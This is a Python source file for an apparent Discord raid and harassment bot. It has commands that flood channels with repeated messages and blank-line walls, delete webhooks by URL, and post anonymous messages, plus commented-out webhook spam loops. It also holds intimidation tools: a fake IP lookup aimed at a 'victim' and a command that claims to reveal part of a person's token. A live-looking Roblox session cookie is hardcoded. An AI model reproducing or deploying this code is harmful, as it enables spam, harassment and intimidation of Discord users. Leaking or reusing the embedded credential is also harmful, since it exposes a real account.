import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import requests
import aiohttp
import re
import random
from datetime import datetime, timezone
import io
import ipaddress
import base64

bot = commands.Bot(command_prefix='>', intents=discord.Intents.all(), allowed_mentions=discord.AllowedMentions(everyone=True, users=True, roles=True))

__token__ = "PUT YOUR TOKEN HERE THIS IS IMPORTANT" # IMPORTANT FILL THIS !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

bot.remove_command("help")

start_time = datetime.now(timezone.utc)

@bot.tree.command(name="say", description="Send message anonymously 😈")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def say(interaction: discord.Interaction, message: str):

    if len(message) >= 2000:
        await interaction.response.send_message("Message must be lower than 2000", ephemeral=True)
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    await interaction.followup.send(message, ephemeral=False)


@bot.tree.command(name="raid", description="Start the raid will ya?")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def rcommand(interaction: discord.Interaction, message: str):
    if len(message) >= 2001:
        await interaction.response.send_message(
            "Message must be lower than 2001", ephemeral=True
        )
        return

    try:
        await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    except discord.Forbidden:
        return
    for _ in range(5):
        await interaction.followup.send(message)


@bot.tree.command(
    name="raidv2",
    description="Start the raid will ya? But 5 times more and bold")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def rcommandv2(interaction: discord.Interaction, message: str):
    if len(message) > 393:
        await interaction.response.send_message(
            "Message must be lower or equal to 393", ephemeral=True
        )
        return

    repeat_msg = """
    # {message}
    # {message}
    # {message}
    # {message}
    # {message}
    """

    try:
        await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    except discord.Forbidden:
        return

    for _ in range(5):
        await interaction.followup.send(repeat_msg, ephemeral=False)


@bot.tree.command(name="webhooksend",
              description="Send a message to a webhook URL")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(webhook_url="Webhook URL to send message to",
                       message="The message to send",
                       username="(Optional) Webhook name",
                       avatar_url="(Optional) Avatar URL")
async def webhooksend(interaction: discord.Interaction,
                      webhook_url: str,
                      message: str,
                      username: str = None,
                      avatar_url: str = None):
    await interaction.response.defer(ephemeral=True)
    payload = {
        "content": message,
    }
    if username:
        payload["username"] = username
    if avatar_url:
        payload["avatar_url"] = avatar_url

    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(webhook_url, json=payload) as resp:
                if resp.status == 204:
                    await interaction.followup.send(
                        "Message sent to webhook succesfully!", ephemeral=True)
                else:
                    await interaction.followup.send(
                        f"Error! Couldn't send message to webhook, status code: {resp.status}",
                        ephemeral=True)
        except Exception as e:
            await interaction.followup.send(
                f"Webhook URL isn't valid or access error: {e}",
                ephemeral=True)


def parse_webhook_url(url: str):
    pattern = r"https://discord(?:app)?\.com/api/webhooks/(\d+)/([\w-]+)"
    match = re.match(pattern, url)
    if match:
        return match.group(1), match.group(2)
    return None, None


@bot.tree.command(name="webhookdelete",
              description="Delete a Discord webhook by URL")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(webhook_url="Webhook URL to delete")
async def webhookdelete(interaction: discord.Interaction, webhook_url: str):
    await interaction.response.defer(ephemeral=True)

    webhook_id, webhook_token = parse_webhook_url(webhook_url)
    if not webhook_id or not webhook_token:
        await interaction.followup.send("Not a valid Webhook!", ephemeral=True)
        return

    delete_url = f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.delete(delete_url) as resp:
                if resp.status == 204:
                    await interaction.followup.send(
                        "Webhook deleted succesfully!", ephemeral=True)
                else:
                    text = await resp.text()
                    await interaction.followup.send(
                        f"Unable to delete. Status: {resp.status} Detail: {text}",
                        ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"An error accured: {e}",
                                            ephemeral=True)


"""class StopSpamView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)
        self.should_stop = asyncio.Event()

    @discord.ui.button(label="🛑 Stop Spamming",
                       style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        self.should_stop.set()
        await interaction.response.send_message("📛 Spam stopped!", ephemeral=True)


@bot.tree.command(
    name="webhookspam",
    description="Spams a message to a webhook URL. Slower but with more success"
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(webhook_url="Webhook URL to send message to",
                       message="The message to send",
                       username="(Optional) Webhook name",
                       avatar_url="(Optional) Avatar URL")
async def webhookspam(interaction: discord.Interaction,
                      webhook_url: str,
                      message: str,
                      username: str = None,
                      avatar_url: str = None):
    view = StopSpamView()
    await interaction.response.send_message(
        "🚀 Spamming... `Click Stop Spamming to stop the spamming`",
        view=view,
        ephemeral=True)

    successes = 0
    failures = 0

    async with aiohttp.ClientSession() as session:
        while not view.should_stop.is_set():
            payload = {"content": message, "username": username}
            if avatar_url:
                payload["avatar_url"] = avatar_url

            try:
                async with session.post(webhook_url, json=payload) as resp:
                    if resp.status == 204:
                        successes += 1
                    elif resp.status == 429:
                        await asyncio.sleep(2)
                        failures += 1
                    else:
                        failures += 1
            except:
                failures += 1

            await asyncio.sleep(0.25)

    try:
        await interaction.followup.send(
            f"✅ **Spamming done!**\\n\\n📨 Successfull: `{successes}`\\n❌ Failure: `{failures}`",
            ephemeral=True)
    except:
        pass


class StopSpamViewV2(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)
        self.should_stop = asyncio.Event()

    @discord.ui.button(label="🛑 Stop Spamming",
                       style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
        self.should_stop.set()
        await interaction.response.send_message("📛 Spam stopped!", ephemeral=True)


@bot.tree.command(
    name="webhookspamv2",
    description=
    "Spams a message to a webhook URL. Faster but with more failure",
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(webhook_url="Webhook URL to send message to",
                       message="The message to send",
                       username="(Optional) Webhook name",
                       avatar_url="(Optional) Avatar URL")
async def webhookspamv2(interaction: discord.Interaction,
                        webhook_url: str,
                        message: str,
                        username: str = None,
                        avatar_url: str = None):
    view = StopSpamViewV2()
    await interaction.response.send_message(
        "🚀 Spamming... `Click Stop Spamming to stop the spamming`",
        view=view,
        ephemeral=True)

    successes = 0
    failures = 0

    async with aiohttp.ClientSession() as session:
        while not view.should_stop.is_set():
            payload = {"content": message, "username": username}
            if avatar_url:
                payload["avatar_url"] = avatar_url

            try:
                async with session.post(webhook_url, json=payload) as resp:
                    if resp.status == 204:
                        successes += 1
                    elif resp.status == 429:
                        await asyncio.sleep(2)
                        failures += 1
                    else:
                        failures += 1
            except:
                failures += 1

    try:
        await interaction.followup.send(
            f"✅ **Spamming done!**\\n\\n📨 Successfull: `{successes}`\\n❌ Failure: `{failures}`",
            ephemeral=True)
    except:
        pass"""


def get_embed_color(percent: int) -> discord.Color:
    gray = 255 - int((percent / 100) * 255)
    return discord.Color.from_rgb(gray, gray, gray)

def get_embed_color_skid(percent: int) -> discord.Color:
    percent = max(0, min(100, percent))
    green = int((100 - percent) * 2.55)
    red = int(percent * 2.55)
    return discord.Color.from_rgb(red, green, 0)

@bot.tree.command(name="skidrate", description="Shows how skid someone is.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="Select who to rate.")
async def skidrate(interaction: discord.Interaction, user: str = None):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    rate = random.randint(0, 100)
    emoji = "👨‍💻"
    target_name = user or interaction.user.mention
    if target_name == "<@797893459200704563>" or target_name.lower() == "xpress045":
        embed = discord.Embed(
            title=f"{emoji} Gay Rate {emoji}",
            description=f"{target_name} is **NOT** a skid.",
            color=discord.Color.green())
        embed.timestamp = discord.utils.utcnow()
    else:
        embed = discord.Embed(
            title=f"{emoji} Skid Rate {emoji}",
            description=f"{target_name} is **{rate}%** skid.",
            color=get_embed_color_skid(rate))
        embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

def get_embed_color_gay(percent: int) -> discord.Color:
    percent = max(0, min(100, percent))

    r = int(128 + (255 - 128) * (percent / 100))
    g = int(128 + (105 - 128) * (percent / 100))
    b = int(128 + (180 - 128) * (percent / 100))

    return discord.Color.from_rgb(r, g, b)

@bot.tree.command(name="gayrate", description="Shows how gay someone is.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="Select who to rate.")
async def gayrate(interaction: discord.Interaction, user: str = None):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    rate = random.randint(0, 100)
    emoji = "🏳‍🌈"
    target_name = user or interaction.user.mention
    if target_name == "<@1332711715682648109>" or target_name.lower() == "k00pzr":
        embed = discord.Embed(
            title=f"{emoji} Gay Rate {emoji}",
            description=f"{target_name} is **101%** gay.",
            color=discord.Color.pink())
        embed.timestamp = discord.utils.utcnow()
    elif target_name == "<@797893459200704563>" or target_name.lower() == "xpress045":
        embed = discord.Embed(
            title=f"{emoji} Gay Rate {emoji}",
            description=f"{target_name} is **NOT** gay.",
            color=discord.Color.from_rgb(0, 0, 0))
        embed.timestamp = discord.utils.utcnow()
    else:
        embed = discord.Embed(
            title=f"{emoji} Gay Rate {emoji}",
            description=f"{target_name} is **{rate}%** gay.",
            color=get_embed_color_gay(rate))
        embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

def get_embed_color_fboy(percent: int) -> discord.Color:
    percent = max(0, min(100, percent))

    r = int(128 + (255 - 128) * (percent / 100))
    g = int(128 + (105 - 128) * (percent / 100))
    b = int(128 + (180 - 128) * (percent / 100))

    return discord.Color.from_rgb(r, g, b)

@bot.tree.command(name="femboyrate", description="Shows how femboy someone is.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="Select who to rate.")
async def femboyrate(interaction: discord.Interaction, user: str = None):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    rate = random.randint(0, 100)
    emoji = "🐺"
    target_name = user or interaction.user.mention

    if target_name == "<@797893459200704563>" or target_name.lower() == "xpress045":
        embed = discord.Embed(
            title=f"{emoji} Femboy Rate {emoji}",
            description=f"{target_name} is **NOT** femboy.",
            color=discord.Color.from_rgb(0, 0, 0))
        embed.timestamp = discord.utils.utcnow()
    else:
        embed = discord.Embed(
            title=f"{emoji} Femboy Rate {emoji}",
            description=f"{target_name} is **{rate}%** femboy.",
            color=get_embed_color_gay(rate))
        embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="yesorno", description="Answers your yes or no questions.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(question="What seems to be the problem?")
async def yesorno(interaction: discord.Interaction, question: str):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    yn = random.choice(["Yes ✅", "No ❌"])    
    colour = discord.Color.green() if yn == "Yes ✅" else discord.Color.red()

    embed = discord.Embed(
        title="Yes Or No",
        description=f"Question = {question}\\nAnswer : {yn}",
        color=colour
        )
    embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="8ball", description="Ask the Magic 8 Ball some question.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(question="What seems to be the problem?")
async def yesorno(interaction: discord.Interaction, question: str):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    yn = random.choice([
    "It is certain",
    "It is decidedly so",
    "Without a doubt",
    "Yes – definitely",
    "You may rely on it",
    "As I see it, yes",
    "Most likely",
    "Outlook good",
    "Yes",
    "Signs point to yes",
    "Reply hazy, try again",
    "Ask again later",
    "Better not tell you now",
    "Cannot predict now",
    "Concentrate and ask again",
    "Don’t count on it",
    "My reply is no",
    "My sources say no",
    "Outlook not so good",
    "Very doubtful"
])

    embed = discord.Embed(
        title="🎱Magic 8 Ball",
        description=f"Question = {question}\\nAnswer : {yn}",
        color=discord.Color.dark_gray()
        )
    embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

def get_embed_color_g(percent: int) -> discord.Color:
    """0-100 arası orana göre beyazdan siyaha embed rengi."""
    gray = int((percent / 100) * 255)
    return discord.Color.from_rgb(gray, gray, gray)

@bot.tree.command(name="goonerrate", description="Shows how gooner someone is.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(user="Select who to rate.")
async def femboyrate(interaction: discord.Interaction, user: str = None):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    rate = random.randint(0, 100)
    emoji = "🍆"
    target_name = user or interaction.user.mention
    if target_name == "<@797893459200704563>" or target_name.lower() == "xpress045":
        embed = discord.Embed(
            title=f"{emoji} Gay Rate {emoji}",
            description=f"{target_name} is **NOT** a gooner.",
            color=discord.Color.from_rgb(0, 0, 0))
        embed.timestamp = discord.utils.utcnow()
    else:
        embed = discord.Embed(
            title=f"{emoji} Gooner Rate {emoji}",
            description=f"{target_name} is **{rate}%** gooner.",
            color=get_embed_color_g(rate))
        embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="uptime", description="Shows how long the bot has been online.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def uptime(interaction: discord.Interaction):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    now = datetime.now(timezone.utc)
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)

    embed = discord.Embed(
        title="⏳ Uptime of XP - 045",
        description=f"{hours} hour(s), {minutes} minute(s) and {seconds} second(s).",
        color=discord.Color.green())
    embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="coinflip", description="Just flip a coin🤑")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(choice="Heads or Tails? (Optional)")
@app_commands.choices(
    choice=[
        app_commands.Choice(name="Heads", value="Heads"),
        app_commands.Choice(name="Tails", value="Tails")
    ]
)
async def coinflip(interaction: discord.Interaction, choice: app_commands.Choice[str] = None):
    ht = random.choice(["Heads", "Tails"])

    await interaction.response.send_message("🪙 And the answer is...")
    msg = await interaction.original_response()

    await asyncio.sleep(1)

    if choice:
        user_choice = choice.value
        if user_choice == ht:
            await msg.edit(content=f"🎉 Congratulations! You were correct!\\nThe answer was **{ht}**.")
        else:
            await msg.edit(content=f"🙁 Try again! You guessed **{user_choice}**, but the answer was **{ht}**.")
    else:
        await msg.edit(content=f"🪙 And the answer is **{ht}**!")

@bot.tree.command(name="slots", description="Spin those slots baby🤑")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def slots(interaction: discord.Interaction):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    EMOJIS = ["🍒", "🍋", "🍉", "🍇", "🔔", "⭐", "💎"]

    result = [random.choice(EMOJIS) for _ in range(3)]

    slot_display = " | ".join(result)

    if result[0] == result[1] == result[2]:
        outcome = "🎉 **JACKPOT!** All are the same!"
        color = discord.Color.gold()
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
        outcome = "😄 **Two matches!** Not so bad"
        color = discord.Color.green()
    else:
        outcome = "🙃 **Not this time.** Try again!"
        color = discord.Color.red()

    embed = discord.Embed(
        title="🎰 SLOTS",
        description=f"`{slot_display}`\\n\\n{outcome}",
        color=color
    )
    embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="clearhistory", description="Spams a message long enough that hides the other messages that were sent.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def clearhistory(interaction: discord.Interaction):
    try:
        await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    except discord.Forbidden:
        return

    try:
        first = await interaction.original_response()
    except discord.NotFound:
        first = None

    for _ in range(5):
        try:
            await interaction.followup.send(f"""
            ‌





































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































‌





































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































‌‌


            """)
        except discord.Forbidden:
            break
        except Exception as e:
            pass

class MessageButton(discord.ui.View):
    def __init__(self, message_to_send: str):
        super().__init__(timeout=None)
        self.message_to_send = message_to_send

    @discord.ui.button(label="SPAM", style=discord.ButtonStyle.primary)
    async def send_messages(
        self,
        interaction: discord.Interaction,
        button: discord.ui.Button
    ):
        await interaction.response.send_message(self.message_to_send)
        for _ in range(5):
            interaction.followup.send(self.message_to_send)

@bot.tree.command(name="bspam", description="Spams the message when you click a button.")
@app_commands.describe(message="The message you want to spam")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def bspam(interaction: discord.Interaction, message: str):
    if interaction.channel.id in (1391815706861113534, 1417585298178707546, 1391816461990891580):
        await interaction.response.send_message(
            "❌ Not in this channel.", ephemeral=True
        )
        return
    view = MessageButton(message)
    await interaction.response.send_message(
            'Click the "SPAM" button below to start spamming:', view=view, ephemeral=True)

@bot.tree.command(name="robloxasset", description="Downloads a Roblox Asset.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def asset(interaction, assetid: int):
    ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhAB.74DE1DD6C8C494030D2943857CFEEFCD7AA243D6F66E8C1E04CD11507DFD24C60BC82E2565F4029904B627D7D4B084C35D34C4ACC5FA4DBBA6A45BCA94367E23981C60C08B85FFCFDB7CC1ADDD599B1FC366AE1740E33573408F6A84D067767C1CE73862C5CA82EB77CA42AA0DB527DACEEB9EF4279FD986DDF633EF9EB002CCAAA1E47C386DD8F0B54CAD086C44EF5A75FEFF93746D769B7EA72B09C2B874D7DD4D3651FE17FDF3C36188BE17303EFB522FF8DF56D3AAFAC4E5BBE577459B35A742AB290D3C6F8C0A2DA6C98C5DFF0C36387DE7699ED5F9167152516B08888ACCBC05D5B9EA7C196DACB26F14EF4CA7FE8336CAA8A9987A9C4EC1B0965E94999E39EF5C0D2590618D47CAB2F7E22359CF8111015C01E44BCDAA3958E295590FD20ABE8F0C5D4920157CE3B7A8AD47E87378D3F20B428F9C10D55C681549CC0A8A6FE750ABFA24063E39D36291BEA91D78FEF77DF90F6C7BC4D07FADF4F1E2461616497BAFE94AB7460E12F8D10565461A98DC5553EC0A2690671743D2E8C262EBD93979852BBADB5511A2603D22A920FFBB64D3336C69333CCC2447C9E1F70241A7742B4364ADCD1067D77DE6A592216890CE6588DFDD9D44524B5B266A4A158A0DC866851FA2ACE905968E6E78702F7843CABC10EFA04A73EB0EA7081D833B8F966B50B4267F3EFCF35CA85234235F72BE6E55374361661D43D9D818B43039DD6DE0914F0073381CC415AB674BAB84C2C9ED98F762B546908F82C1799774CD56E37FBCA8A1AA9C47F850AB78E6CD8CC680FD91118C9B08D8EEAE4D1B2EA1A1A74699C96DCDC44FC8DC2A355778CE99B93D1F679263204B916A787769F735FD88E52DF67609C3E7CCEDAD7401F5346CE8770BC5CADA0584198AB2E46EC8FC4D244A55E125577294F62937CC323B48D110DA7BCCE9F6DD36AF493B069682393F4FBDCDA5568B06198DDD110EB8FAA0B7BC9B85B567BCA956ABCF6C1EE3E0AEC53A7B5269F33253434D3BB25A751C54BCCACAC86A3A2643B9E7F4863593BF9F72D04563D424F6AC8749FCC4715F301D67FF2195353424CC7BA7BDAAD19827A995036589E0E0932EA2AE6C537ADA0EE1E72E0843D6CD0765DF7BE735EE449ABACC3DC0BF96F99E01BCA9A794E473F11D8C02CA7D5CDEF8AD785B772FCBF3F3E0239CDD8270690ACE352EF960D53FB75325BC7144E4296172456EEB8E12DFB211BF43E77DD84E8E7021D5784F983005591877F0B4D2EB19B87F461DEB48AFDF4BFCABC68EE4"
    await interaction.response.defer()

    url = f"https://assetdelivery.roblox.com/v1/asset?id={assetid}"
    headers = {
        "Cookie": f".ROBLOSECURITY={ROBLOSECURITY}",
        "User-Agent": "Roblox/WinInet"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()

        file_bytes = io.BytesIO(response.content)
        file_bytes.name = f"{assetid}.rbxm"

        await interaction.followup.send(
            content=f"✅ Asset `{assetid}` has been downloaded succesfully!",
            file=discord.File(file_bytes)
        )

    except requests.exceptions.RequestException as e:
        await interaction.followup.send(
            content=f"❌ An error has accured: `{str(e)}`"
        )

@bot.tree.command(name="sync", description="Owner Only.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def sync_commands(interaction: discord.Interaction):
    ALLOWED_USER_IDS = [723113610725031988, 797893459200704563]
    if interaction.user.id in ALLOWED_USER_IDS:
        await bot.tree.sync()
        await interaction.response.send_message("Commands has been synced ✅", ephemeral=True)
    else:
        await interaction.response.send_message("❌ You dont have permission's to do that.", ephemeral=True)

@bot.tree.command(name="uidlookup", description="Shows the info of the user you sent the id of.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def userinfo(interaction: discord.Interaction, uid: str):
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    try:
        user_id = int(uid)
        fetched_user = await interaction.client.fetch_user(user_id)
    except ValueError:
        await interaction.response.send_message("Please enter a valid number.", ephemeral=True)
        return
    except discord.NotFound:
        await interaction.response.send_message(f"User with UID `{uid}` couldn't be found.", ephemeral=True)
        return

    embed = discord.Embed(title="User ID Lookup", color=0x0000FF)
    embed.set_author(name=f"{fetched_user.name}#{fetched_user.discriminator}", icon_url=fetched_user.display_avatar.url)
    embed.set_thumbnail(url=fetched_user.display_avatar.url)

    embed.add_field(name="ID", value=f"`{fetched_user.id}`", inline=False)
    embed.add_field(name="Username", value=f"`{fetched_user.name}`", inline=False)
    embed.add_field(name="Bot?", value=f"`{fetched_user.bot}`", inline=True)
    embed.add_field(name="Creation Date", value=f'`{fetched_user.created_at.strftime("%m/%d/%Y %H:%M")}`', inline=False)

    flags = []
    public_flags = fetched_user.public_flags
    for flag_name, value in public_flags:
        if value:
            flags.append(flag_name.replace("_", " ").title())

    if flags:
        embed.add_field(name="Badges", value=", ".join(flags), inline=False)
    else:
        embed.add_field(name="Badges", value="`N/A`", inline=False)

    if hasattr(fetched_user, "bio") and fetched_user.bio:
        embed.add_field(name="Bio", value=f"`{fetched_user.bio}`", inline=False)

    if fetched_user.banner:
        embed.set_image(url=fetched_user.banner.url)

    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="iplookup", description="Shows the information of the ip you sent.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def iplook(interaction: discord.Interaction, ip: str):
    await interaction.response.defer()

    url = f"https://ipinfo.io/{ip}/json"

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=10) as r:
                if r.status == 200:
                    data = await r.json()
                else:
                    try:
                        data = await r.json()
                    except Exception:
                        await interaction.followup.send(f"Error: {r.status}")
                        return
        except Exception as e:
            await interaction.followup.send(f"Error: {e}")
            return

    if "error" in data or data.get("bogon") is True:
        msg = data.get("error", {}).get("title") or data.get("message") or "Invalid or private IP."
        await interaction.followup.send(f"Couldnt lookup id: {msg}")
        return

    embed = discord.Embed(
        title=f"IP Info — {data.get('ip', ip)}",
        color=discord.Color.blurple()
    )

    def add_field(name, value):
        if value:
            embed.add_field(name=name, value=value, inline=True)

    add_field("Hostname", data.get("hostname"))
    add_field("Location", ", ".join(filter(None, [data.get("city"), data.get("region"), data.get("country")])))
    add_field("Coordinates", data.get("loc"))
    add_field("Organisation", data.get("org"))
    add_field("Postal Code", data.get("postal"))
    add_field("Time Period", data.get("timezone"))
    if "anycast" in data:
        add_field("Anycast", str(data.get("anycast")))

    embed.set_footer(text="Some data may be lacking (with anonymous lookup).")
    embed.set_author(name=str(interaction.user), icon_url=interaction.user.display_avatar.url)
    embed.timestamp = discord.utils.utcnow()

    await interaction.followup.send(embed=embed)

def random_public_ipv4(max_tries: int = 1000) -> str:
    for _ in range(max_tries):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        try:
            a = ipaddress.ip_address(ip)
        except Exception:
            continue
        if not (a.is_private or a.is_multicast or a.is_loopback or a.is_reserved or a.is_unspecified):
            return ip
    return "8.8.8.8"

async def lookup_ipinfo(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=None) as r:
                text = await r.text()
                try:
                    data = await r.json()
                except Exception:
                    raise RuntimeError(f"Unexpected response (status={r.status}): {text[:300]}")
                data["_status"] = r.status
                return data
        except asyncio.TimeoutError:
            raise RuntimeError("IP lookup timed out.")
        except Exception as e:
            raise RuntimeError(f"Lookup error: {e}")

@bot.tree.command(name="fakeiplookup", description="Shows some fake IP to a victim.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def fiplookup(interaction: discord.Interaction, victim: str):
    await interaction.response.defer()

    generated_ip = random_public_ipv4()

    victim_name = victim

    try:
        data = await lookup_ipinfo(generated_ip)
    except Exception as e:
        await interaction.followup.send(f"Error while lookinp up ip: {e}")
        return

    if (
        ("error" in data)
        or (data.get("bogon") is True)
        or (data.get("_status") and data["_status"] != 200)
    ):
        await interaction.followup.send(f"An error has occurred, please try again.")
        return

    ip_shown = data.get("ip", generated_ip)
    hostname = data.get("hostname")
    city = data.get("city")
    region = data.get("region")
    country = data.get("country")
    loc = data.get("loc")
    org = data.get("org")
    postal = data.get("postal")
    timezone = data.get("timezone")
    anycast = data.get("anycast")

    embed = discord.Embed(
        title=f"IP Info of {victim_name} — {ip_shown}",
        color=discord.Color.blurple(),
        timestamp=discord.utils.utcnow(),
    )

    def add_field(name, value):
        if value:
            embed.add_field(name=name, value=str(value), inline=True)

    add_field("Hostname", hostname)
    add_field("Location", ", ".join(filter(None, [city, region, country])))
    add_field("Coordinates", loc)
    add_field("Organisation", org)
    add_field("Postal Code", postal)
    add_field("Timezone", timezone)
    if anycast is not None:
        add_field("Anycast", str(anycast))

    embed.set_author(name=str(victim))
    await interaction.followup.send(embed=embed, ephemeral=False)

@bot.tree.command(name="tokenreveal", description="Reveals the first part of the userid's token.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(uid="The user id of the victim")
async def userinfo(interaction: discord.Interaction, uid: str):
    token = base64.b64encode(uid.encode()).decode().rstrip("=") + ""
    await interaction.response.send_message("https://discord.gg/a22QbYvre7", ephemeral=True)
    await interaction.followup.send(f"The first part of <@{uid}>'s token is `{token}`", ephemeral=False)

@bot.tree.command(name="invitelookup", description="Looks up a server invite.")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ilookup(interaction: discord.Interaction, invite_link : str):
    await interaction.response.defer(ephemeral=True)

    await interaction.followup.send("This message exists for your message to be anonymous.", ephemeral=True)

    await interaction.followup.send("https://discord.gg/a22QbYvre7", ephemeral=True)

    match = re.search(r"(?:https?://)?discord\.(?:gg|com)/invite/([a-zA-Z0-9-]+)|(?:https?://)?discord(?:app)?\.com/invite/([a-zA-Z0-9-]+)|([a-zA-Z0-9-]+)", invite_link.strip())
    if not match:
        await interaction.followup.send("❌ Geçersiz invite formatı. Tam link veya sadece kodu yapıştırın (örnek: discord.gg/ABC123)", ephemeral=True)
        return

    try:
        invite = await bot.fetch_invite(invite_link, with_counts=True, with_expiration=True)
    except discord.NotFound:
        await interaction.followup.send("❌ Invite couldn't be found or is expired.", ephemeral=True)
        return
    except discord.Forbidden:
        await interaction.followup.send("❌ I can't access this invite.", ephemeral=True)
        return
    except Exception:
        await interaction.followup.send("❌ Invalid or inaccessible invite.", ephemeral=True)
        return

    guild = invite.guild
    inviter = invite.inviter
    channel = invite.channel

    if not guild:
        await interaction.followup.send("❌ Couldn't fetch server information.", ephemeral=True)
        return

    verification_levels = {
        discord.VerificationLevel.none: "None",
